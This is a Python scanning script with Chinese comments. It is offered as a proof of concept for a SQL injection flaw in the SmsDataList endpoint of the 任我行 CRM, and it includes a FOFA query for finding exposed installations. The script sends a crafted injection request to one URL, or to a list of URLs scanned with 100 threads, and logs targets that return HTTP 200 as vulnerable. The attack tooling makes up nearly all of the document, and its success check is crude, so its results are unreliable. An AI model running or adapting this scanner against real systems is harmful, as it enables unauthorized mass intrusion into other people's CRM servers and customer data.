#任我行 CRM SmsDataList SQL注入漏洞
#fofa:"欢迎使用任我行CRM"

import requests ,argparse ,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                 ███████╗ ██████╗ ██╗          ████████╗██╗███╗   ███╗███████╗
                ██╔════╝██╔═══██╗██║          ╚══██╔══╝██║████╗ ████║██╔════╝
                ███████╗██║   ██║██║             ██║   ██║██╔████╔██║█████╗
                ╚════██║██║▄▄ ██║██║             ██║   ██║██║╚██╔╝██║██╔══╝
                ███████║╚██████╔╝███████╗███████╗██║   ██║██║ ╚═╝ ██║███████╗
                ╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝

                                                                          author:秋妤
                                                                          date:2024.09.03
                                                                          version:1.0
        """
    print(test)


def poc(target):
    payload = "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '170'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = """Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000*"""
    try:
        res1 = requests.get(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('CRM_result.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

def main():
    banner()
    parser = argparse.ArgumentParser(description="任我行 CRM SmsDataList SQL注入漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file ,'r' ,encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n' ,''))
        mp = Pool(100)
        mp.map(poc ,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()